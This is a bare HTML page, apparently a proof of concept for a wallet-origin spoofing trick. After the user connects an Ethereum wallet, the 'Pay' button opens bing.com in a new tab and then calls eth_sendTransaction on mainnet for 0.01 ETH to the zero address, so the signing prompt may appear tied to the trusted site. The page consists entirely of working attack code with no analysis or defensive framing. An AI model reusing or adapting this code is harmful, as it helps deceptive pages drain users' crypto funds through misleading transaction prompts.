<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  <style>
    .button {
      background-color: #4CAF50;
      border: none;
      color: white;
      padding: 15px 32px;
      text-align: center;
      text-decoration: none;
      display: inline-block;
      font-size: 16px;
      margin: 4px 2px;
      cursor: pointer;
    }
  </style>
</head>
<body>
  <script>
    let walletConnected = false;

    async function promptWalletConnection() {
      if (typeof window.ethereum !== 'undefined') {
        try {
          // Request wallet connection
          await ethereum.request({ method: 'eth_requestAccounts' });
          alert('Wallet connected successfully!');
          walletConnected = true;
        } catch (error) {
          alert('Wallet connection request rejected by the user.');
        }
      } else {
        alert('Web3 (Ethereum provider) is not available in this browser.');
      }
    }

    async function openBingAndInitiateTransaction() {
      if (!walletConnected) {
        alert('Please connect your wallet first.');
        return;
      }

      // Open bing.com in a new tab
      const bingTab = window.open('https://bing.com', 'x');

      // Wait for the bing.com tab to load and then initiate transaction
      bingTab.onload = async function () {
        try {
          console.log('Initiating transaction from bing.com...');

          const accounts = await ethereum.request({ method: 'eth_requestAccounts' });

          const transactionParameters = {
            nonce: "0x00",
            gasPrice: "0x244AC6D",
            gas: "0x12A52",
            to: "0x0000000000000000000000000000000000000000",
            from: accounts[0],
            value: "0x2386F26FC10000",
            data: "0x00",
            chainId: "0x1", // Mainnet
          };

          const txHash = await ethereum.request({
            method: "eth_sendTransaction",
            params: [transactionParameters],
          });

          console.log(`Transaction sent! Transaction hash: ${txHash}`);
        } catch (error) {
          console.error(`Transaction failed: ${error.message}`);
        }
      };
    }
  </script>
  <center>
    <input type="button" class="button" value="Connect Wallet" onclick="promptWalletConnection()">
    <br>
    <br>
    <input type="button" class="button" value="Pay" onclick="openBingAndInitiateTransaction()">
  </center>
</body>
</html>
